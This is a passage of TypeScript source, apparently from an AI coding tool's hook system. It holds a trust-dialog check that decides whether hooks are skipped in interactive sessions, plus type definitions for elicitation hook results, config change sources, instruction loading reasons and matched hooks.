 * - hooks de SubagentStop ejecutándose cuando el subagente termina antes de
 *   la confianza.
 *
 * @returns true si el hook debe omitirse, false si debe ejecutarse
 */
export function shouldSkipHookDueToTrust(): boolean {
  const isInteractive = !getIsNonInteractiveSession()
  if (!isInteractive) {
    return false
  }

  const hasTrust = checkHasTrustDialogAccepted()
  return !hasTrust
}
export type ConfigChangeSource =
  | 'user_settings'
  | 'project_settings'
  | 'local_settings'
  | 'policy_settings'
  | 'skills'

/** Result of an elicitation hook execution (non-REPL path). */
export type ElicitationHookResult = {
  elicitationResponse?: ElicitationResponse
  blockingError?: HookBlockingError
}

/** Re-export ElicitResult from MCP SDK as ElicitationResponse for backward compat. */
export type ElicitationResponse = ElicitResult

/** Result of an elicitation-result hook execution (non-REPL path). */
export type ElicitationResultHookResult = {
  elicitationResultResponse?: ElicitationResponse
  blockingError?: HookBlockingError
}

type FunctionHookMatcher = {
  matcher: string
  hooks: FunctionHook[]
}

type IfConditionMatcher = (ifCondition: string) => boolean

export type InstructionsLoadReason =
  | 'session_start'
  | 'nested_traversal'
  | 'path_glob_match'
  | 'include'
  | 'compact'

export type InstructionsMemoryType = 'User' | 'Project' | 'Local' | 'Managed'

/**
 * A hook paired with optional plugin context.
 * Used when returning matched hooks so we can apply plugin env vars at execution time.
 */
type MatchedHook = {
  hook: HookCommand | HookCallback | FunctionHook
  pluginRoot?: string
  pluginId?: string
  skillRoot?: string
  hookSource?: string
}

const TOOL_HOOK_EXECUTION_TIMEOUT_MS = 10 * 60 * 1000
